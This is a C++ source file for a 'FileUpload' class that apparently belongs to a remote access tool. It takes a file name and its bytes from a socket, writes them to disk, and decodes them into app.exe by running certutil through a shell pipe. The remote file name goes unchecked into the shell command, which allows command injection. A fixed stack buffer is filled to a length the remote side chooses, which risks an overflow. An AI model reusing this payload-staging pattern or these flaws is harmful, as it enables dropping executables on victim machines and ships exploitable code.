#include "FileUpload.h"


static FILE* pFile;
static FILE* pPipe;
static SOCKET sClientSocket;
char filename[50] = { 0 };

FileUpload::FileUpload(SOCKET sIncomingSocket) {


	sClientSocket = sIncomingSocket; 
	FileUpload::UploadFile();
	FileUpload::DecodeFile(filename);

}

FileUpload::~FileUpload() {

}


bool FileUpload::UploadFile() {

	char filesize[10];
	char fileBytes[1000000] = { 0 };
	int received_file;
	DWORD file_size;
	int remain_data = 0;


	recv(sClientSocket, filename, sizeof(filename), 0);
	printf("%s\n", filename);
	recv(sClientSocket, filesize, sizeof(filesize), 0);

	file_size = atoi(filesize);
	printf("%d\n", file_size);

	received_file = fopen_s(&pFile, filename, "w");

	if (received_file != 0) {
		printf("failed to open file");
	}

	remain_data = file_size;

	recv(sClientSocket, fileBytes, file_size, 0);

	printf("%d\n", file_size);

	//CryptStringToBinaryA(fileBytes, file_size, CRYPT_STRING_BASE64, &plaintext, &file_size, NULL, NULL);

	printf("%d\n", file_size);

	fwrite(&fileBytes, sizeof(char), file_size, pFile);

	printf("writing is done\n");

	fclose(pFile);

	return true;
}

bool FileUpload::DecodeFile(char* filename) {

	char decodecommand[100] = "certutil -decode ";

	strcat_s(decodecommand, filename);
	strcat_s(decodecommand, " app.exe");

	pPipe = _popen(decodecommand, "r");

	_pclose(pPipe);

	return true;
}
